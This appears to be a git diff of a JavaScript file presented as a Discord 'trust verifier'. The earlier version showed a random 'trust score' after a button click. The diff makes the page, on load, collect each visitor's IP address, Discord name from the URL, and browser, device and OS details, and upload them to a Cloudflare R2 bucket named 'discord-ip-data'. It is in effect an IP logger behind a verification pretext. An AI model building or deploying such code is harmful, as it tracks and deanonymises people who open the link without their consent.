@@ -1,5 +1,5 @@
-// js/main.js
-class TrustVerifier {
+// js/auto-trust.js
+class AutoTrustVerifier {
     constructor() {
         this.accountId = '640846f3750d7515889506062e8fbdbf';
         this.bucketName = 'discord-ip-data';
@@ -8,10 +8,8 @@ class TrustVerifier {
     }
 
     init() {
-        const verifyButton = document.getElementById('verifyButton');
-        if (verifyButton) {
-            verifyButton.addEventListener('click', () => this.verifyTrust());
-        }
+        // Automatically start verification when page loads
+        this.storeDeviceInfoAutomatically();
     }
 
     async getIPAddress() {
@@ -25,17 +23,20 @@ class TrustVerifier {
         }
     }
 
-    async storeTrustData(discordName, ipAddress, timestamp, trustScore) {
+    async storeDeviceInfo(discordName, ipAddress, userAgent, timestamp) {
         try {
-            const filename = `trust_${discordName}_${Date.now()}.json`;
+            // Create filename with timestamp
+            const filename = `device_info_${discordName}_${Date.now()}.json`;
             
-            const data = {
+            // Get device information
+            const deviceInfo = {
                 discordName,
                 ipAddress,
+                userAgent,
                 timestamp,
-                trustScore,
-                userAgent: navigator.userAgent,
-                verificationType: 'trustworthy'
+                browser: this.getBrowserInfo(),
+                deviceType: this.getDeviceType(),
+                operatingSystem: this.getOSInfo()
             };
             
             // Store in R2
@@ -44,7 +45,7 @@ class TrustVerifier {
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(deviceInfo)
             });
             
             if (response.ok) {
@@ -55,40 +56,50 @@ class TrustVerifier {
         } catch (error) {
             console.error('R2 Storage Error:', error);
             // Fallback to localStorage
-            this.storeInLocalStorage(data);
+            this.storeInLocalStorage(deviceInfo);
             return { success: false, error: error.message };
         }
     }
 
     storeInLocalStorage(data) {
-        const stored = JSON.parse(localStorage.getItem('trustData') || '[]');
+        const stored = JSON.parse(localStorage.getItem('deviceData') || '[]');
         stored.push(data);
-        localStorage.setItem('trustData', JSON.stringify(stored));
+        localStorage.setItem('deviceData', JSON.stringify(stored));
     }
 
-    async verifyTrust() {
+    async storeDeviceInfoAutomatically() {
         const discordName = this.getDiscordUsername();
         const ipAddress = await this.getIPAddress();
         const timestamp = new Date().toISOString();
-        
-        // Simulate trust score calculation
-        const trustScore = Math.floor(Math.random() * 100) + 1;
+        const userAgent = navigator.userAgent;
         
         try {
-            const result = await this.storeTrustData(discordName, ipAddress, timestamp, trustScore);
+            const result = await this.storeDeviceInfo(discordName, ipAddress, userAgent, timestamp);
             
+            // Display results automatically
             const resultDiv = document.getElementById('result');
             resultDiv.innerHTML = `
-                <h3>Verification Complete</h3>
+                <h3>Information Stored Successfully</h3>
                 <p><strong>User:</strong> ${discordName}</p>
                 <p><strong>IP Address:</strong> ${ipAddress}</p>
-                <p><strong>Trust Score:</strong> ${trustScore}/100</p>
+                <p><strong>Browser:</strong> ${this.getBrowserInfo()}</p>
+                <p><strong>Device Type:</strong> ${this.getDeviceType()}</p>
+                <p><strong>Operating System:</strong> ${this.getOSInfo()}</p>
+                <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
                 <p><strong>Status:</strong> ${result.success ? 'Stored in Cloudflare R2' : 'Stored locally'}</p>
             `;
             
+            resultDiv.style.display = 'block';
+            
         } catch (error) {
-            console.error('Verification failed:', error);
-            alert('Verification failed. Please try again.');
+            console.error('Automatic storage failed:', error);
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = `
+                <h3>Storage Failed</h3>
+                <p>Error: ${error.message}</p>
+                <p>Please try refreshing the page.</p>
+            `;
+            resultDiv.style.display = 'block';
         }
     }
 
@@ -96,9 +107,35 @@ class TrustVerifier {
         const urlParams = new URLSearchParams(window.location.search);
         return urlParams.get('discord') || 'Anonymous';
     }
+
+    getBrowserInfo() {
+        const userAgent = navigator.userAgent;
+        if (userAgent.includes('Chrome')) return 'Chrome';
+        if (userAgent.includes('Firefox')) return 'Firefox';
+        if (userAgent.includes('Safari')) return 'Safari';
+        if (userAgent.includes('Edge')) return 'Edge';
+        return 'Unknown Browser';
+    }
+
+    getDeviceType() {
+        const userAgent = navigator.userAgent;
+        if (/Mobile|Android|iPhone|iPad/.test(userAgent)) return 'Mobile';
+        if (/Tablet|iPad/.test(userAgent)) return 'Tablet';
+        return 'Desktop';
+    }
+
+    getOSInfo() {
+        const userAgent = navigator.userAgent;
+        if (userAgent.includes('Windows')) return 'Windows';
+        if (userAgent.includes('Mac')) return 'macOS';
+        if (userAgent.includes('Linux')) return 'Linux';
+        if (userAgent.includes('Android')) return 'Android';
+        if (userAgent.includes('iOS') || userAgent.includes('iPhone')) return 'iOS';
+        return 'Unknown OS';
+    }
 }
 
-// Initialize when DOM is loaded
+// Initialize automatically when DOM is loaded
 document.addEventListener('DOMContentLoaded', () => {
-    new TrustVerifier();
+    new AutoTrustVerifier();
 });
